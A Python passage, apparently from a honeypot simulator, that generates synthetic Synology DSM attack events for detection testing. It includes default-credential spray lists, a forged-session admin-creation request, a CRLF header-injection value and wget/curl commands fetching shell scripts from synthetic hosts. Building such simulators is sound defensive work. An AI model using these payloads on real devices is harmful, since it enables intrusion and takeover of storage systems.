            "flags": sorted(flags_seen),
            "transports": ["udp"],
        },
    )


# ---------------------------------------------------------------- Synology DSM

DSM_USERS = ["admin", "admin", "admin", "root", "user", "guest", "administrator", "synology"]
DSM_PASSWORDS = [
    "admin", "password", "123456", "synology", "12345678", "admin123", "qwerty", "changeme",
    "Passw0rd", "1234", "welcome1", "root", "diskstation", "P@ssw0rd",
]  # fmt: skip
DSM_AGENTS = [
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "curl/8.5.0",
    "",  # no user agent at all
]
DSM_CVES = ["CVE-2026-13639", "CVE-2026-13684"]


def _dsm_req(
    b: Builder,
    agent: str,
    method: str,
    path: str,
    query: str,
    body: str,
    status: int,
    flags: list[str],
    *,
    gap: tuple[float, float] = (0.1, 1.0),
    **extra: Any,
) -> None:
    headers = {"Host": "nas", "Accept": "*/*", "Connection": "close"}
    if agent:
        headers["User-Agent"] = agent
    else:
        flags = [*flags, "no_user_agent"]
    if method == "POST":
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))
    headers.update(extra.pop("headers", {}))
    data: dict[str, Any] = {
        "method": method,
        "path": path,
        "query": query,
        "headers": headers,
        "user_agent": agent,
        "body_preview": body,
        "status": status,
        "flags": flags,
    }
    if {"sid_forge", "scgi_injection"} & set(flags):
        data["cve"] = list(DSM_CVES)
    data.update(extra)
    b.add(EventType.http_request, data, gap)


def build_synology(rng: random.Random, ip: str) -> Plan:
    tls = rng.random() < 0.45
    plan = _new_plan(rng, SensorName.synology, ip, 5001 if tls else 5000)
    b = Builder(rng, plan)
    b.connect({"tls": tls, "protocol": "HTTP"})
    agent = rng.choice(DSM_AGENTS)
    kind = pick(
        rng,
        [
            ("version", 30),
            ("spray", 40),
            ("sid_forge", 8),
            ("scgi", 8),
            ("ransom", 3),
            ("browse", 11),
        ],
    )
    api = ["dsm_api"]
    entry = "/webapi/entry.cgi"
    if kind == "version":
        for path, query in rng.sample(
            [
                ("/webapi/query.cgi", "api=SYNO.API.Info&version=1&method=query&query=all"),
                ("/webman/info.cgi", ""),
                ("/webman/login.cgi", ""),
                ("/", ""),
            ],
            rng.randint(1, 3),
        ):
            webapi = path.startswith("/webapi")
            _dsm_req(
                b,
                agent,
                "GET",
                path,
                query,
                "",
                200,
                ["dsm_api", "dsm_version_probe"] if webapi else ["dsm_version_probe"],
            )
    elif kind == "spray":
        users = rng.sample(DSM_USERS, rng.randint(1, 3))
        for user in users:
            for pw in rng.sample(DSM_PASSWORDS, rng.randint(3, 10)):
                otp = rng.random() < 0.05
                body = f"api=SYNO.API.Auth&version=7&method=login&account={user}&passwd={pw}"
                _dsm_req(
                    b, agent, "POST", entry, "", body, 403, [*api, "dsm_login"], gap=(0.2, 0.9)
                )
                b.add(
                    EventType.login_attempt,
                    {
                        "username": user,
                        "password": pw,
                        "otp_present": otp,
                        "success": False,
                        "method": "SYNO.API.Auth",
                    },
                    (0.0, 0.05),
                )
        if rng.random() < 0.12:
            _dsm_req(b, agent, "POST", entry, "", "x" * 2048, 413, [*api, "oversized_body"])
    elif kind == "sid_forge":
        sid = _rand_alnum(
            rng, 24, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        )
        _dsm_req(b, agent, "GET", "/webman/info.cgi", "", "", 200, ["dsm_version_probe"])
        _dsm_req(
            b,
            agent,
            "POST",
            entry,
            f"_sid={sid}",
            "api=SYNO.Core.User&version=1&method=create&name=sysadm",
            200,
            [*api, "sid_forge"],
            headers={"Cookie": f"id={sid}"},
        )
        if rng.random() < 0.5:
            host = synthetic_host(rng)
            url = f"http://{host}/{_rand_alnum(rng, 6, 'abcdefghijklmnopqrstuvwxyz')}.sh"
            b.add(
                EventType.download_attempt,
                {"url": url, "tool": "wget", "command": "wget " + url},
                (0.1, 0.8),
            )
    elif kind == "scgi":
        _dsm_req(
            b,
            agent,
            "POST",
            entry,
            "",
            "api=SYNO.API.Auth&version=7&method=login",
            200,
            [*api, "scgi_injection"],
            headers={"X-Forwarded-For": "127.0.0.1\r\nSCGI: 1\r\nREMOTE_USER: admin"},
        )
        if rng.random() < 0.4:
            host = synthetic_host(rng)
            url = f"http://{host}/{_rand_alnum(rng, 6, 'abcdefghijklmnopqrstuvwxyz')}.sh"
            b.add(
                EventType.download_attempt,
                {"url": url, "tool": "curl", "command": "curl -O " + url},
                (0.1, 0.8),
            )
    elif kind == "ransom":
        _dsm_req(b, agent, "GET", "/webman/info.cgi", "", "", 200, ["dsm_version_probe"])
        _dsm_req(
            b,
            agent,
            "POST",
            entry,
            "",
            "api=SYNO.FileStation.Upload&method=upload&path=/volume1/homes&filename=README_C3RB3R.txt",
            200,
            [*api, "file_write", "ransom_indicator"],
        )
    else:
        for path in rng.sample(["/", "/index.cgi", "/favicon.ico", "/robots.txt"], 2):
            _dsm_req(b, agent, "GET", path, "", "", 200, [])
    return b.finish("closed", extra={"tls": tls})
